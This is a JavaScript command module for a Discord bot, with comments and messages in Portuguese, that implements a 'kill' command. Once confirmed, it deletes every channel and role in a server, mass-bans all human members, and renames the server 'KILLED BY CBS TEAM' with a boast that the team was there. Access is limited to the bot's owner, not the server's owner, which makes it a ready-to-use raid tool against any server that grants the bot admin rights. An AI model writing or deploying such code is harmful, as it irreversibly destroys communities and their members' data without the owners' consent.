const { SlashCommandBuilder, PermissionFlagsBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('kill')
    .setDescription('💀 DESTRUIÇÃO TOTAL – Apaga tudo e bane todos (APENAS DONO)')
    .addBooleanOption(option =>
      option.setName('confirmar')
        .setDescription('Confirme que quer destruir o servidor (true/false)')
        .setRequired(true)
    ),

  async execute(interaction, client) {
    const DONO_ID = '1409370594138525746';

    // ===== VERIFICA SE É O DONO =====
    if (interaction.user.id !== DONO_ID) {
      return interaction.reply({
        content: '❌ **ACESSO NEGADO!** Apenas o dono do bot pode usar este comando.',
        ephemeral: true
      });
    }

    // ===== VERIFICA SE O BOT TEM ADM =====
    const botMember = interaction.guild.members.cache.get(client.user.id);
    if (!botMember.permissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({
        content: '❌ Eu preciso ser **ADMINISTRADOR** para executar este comando.',
        ephemeral: true
      });
    }

    const confirmar = interaction.options.getBoolean('confirmar');

    if (!confirmar) {
      // ===== PEDE CONFIRMAÇÃO =====
      const embed = new EmbedBuilder()
        .setTitle('💀 ATENÇÃO – DESTRUIÇÃO TOTAL')
        .setDescription('**Você está prestes a DESTRUIR COMPLETAMENTE este servidor!**\n\n' +
          'Isso irá:\n' +
          '🔹 Apagar **TODOS** os canais (texto, voz, categorias)\n' +
          '🔹 Apagar **TODOS** os cargos\n' +
          '🔹 **BANIR TODOS** os membros\n' +
          '🔹 Mudar o nome do servidor para "KILLED BY CBS TEAM"\n\n' +
          '⚠️ **ESTA AÇÃO É IRREVERSÍVEL!**')
        .setColor(0xFF0000)
        .setFooter({ text: 'Clique em CONFIRMAR para executar' })
        .setTimestamp();

      const row = new ActionRowBuilder()
        .addComponents(
          new ButtonBuilder()
            .setCustomId('kill_confirm')
            .setLabel('💀 CONFIRMAR DESTRUIÇÃO')
            .setStyle(ButtonStyle.Danger),
          new ButtonBuilder()
            .setCustomId('kill_cancel')
            .setLabel('❌ CANCELAR')
            .setStyle(ButtonStyle.Secondary)
        );

      await interaction.reply({
        embeds: [embed],
        components: [row],
        ephemeral: true
      });
      return;
    }

    // ===== EXECUÇÃO DIRETA (SE confirmar: true) =====
    await interaction.deferReply({ ephemeral: true });
    await executarKill(interaction, client);
  }
};

// ===== FUNÇÃO PRINCIPAL =====
async function executarKill(interaction, client) {
  const guild = interaction.guild;
  const botId = client.user.id;
  const authorId = interaction.user.id;

  try {
    // ===== 1. APAGAR TODOS OS CANAIS =====
    await interaction.editReply('🧹 APAGANDO TODOS OS CANAIS...');
    const channels = guild.channels.cache;
    let canaisApagados = 0;
    for (const [id, ch] of channels) {
      try {
        await ch.delete();
        canaisApagados++;
        if (canaisApagados % 10 === 0) {
          await interaction.editReply(`🧹 ${canaisApagados}/${channels.size} canais apagados`);
        }
      } catch (e) {}
    }

    // ===== 2. APAGAR TODOS OS CARGOS =====
    await interaction.editReply('🧹 APAGANDO TODOS OS CARGOS...');
    const roles = guild.roles.cache.filter(r => r.id !== guild.id);
    let cargosApagados = 0;
    for (const [id, r] of roles) {
      try {
        await r.delete();
        cargosApagados++;
        if (cargosApagados % 10 === 0) {
          await interaction.editReply(`🧹 ${cargosApagados}/${roles.size} cargos apagados`);
        }
      } catch (e) {}
    }

    // ===== 3. BANIR TODOS OS MEMBROS (exceto bot e autor) =====
    await interaction.editReply('🔨 BANINDO TODOS OS MEMBROS...');
    const members = guild.members.cache.filter(m => m.id !== botId && m.id !== authorId && !m.user.bot);
    let banidos = 0;
    const list = [...members.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(m => m.ban({ reason: 'KILLED BY CBS TEAM' }).catch(() => {})));
      banidos += chunk.length;
      await interaction.editReply(`🔨 ${banidos}/${members.size} membros banidos`);
    }

    // ===== 4. MUDAR NOME E FOTO DO SERVIDOR =====
    try {
      await guild.setName('KILLED BY CBS TEAM');
      if (client.user.avatarURL()) {
        const avatar = await fetch(client.user.avatarURL({ size: 256, extension: 'png' }));
        const buffer = await avatar.buffer();
        await guild.setIcon(buffer);
      }
    } catch (e) {}

    // ===== 5. FINAL =====
    await interaction.editReply(
      `✅ **DESTRUIÇÃO TOTAL CONCLUÍDA!**\n\n` +
      `📂 ${canaisApagados} canais apagados\n` +
      `🎭 ${cargosApagados} cargos apagados\n` +
      `🔨 ${banidos} membros banidos\n` +
      `📝 Nome do servidor alterado para "KILLED BY CBS TEAM"\n\n` +
      `🔥 **CBS TEAM ESTEVE AQUI!**`
    );

  } catch (error) {
    console.error('❌ ERRO NO KILL:', error);
    await interaction.editReply(`❌ ERRO: ${error.message}`);
  }
}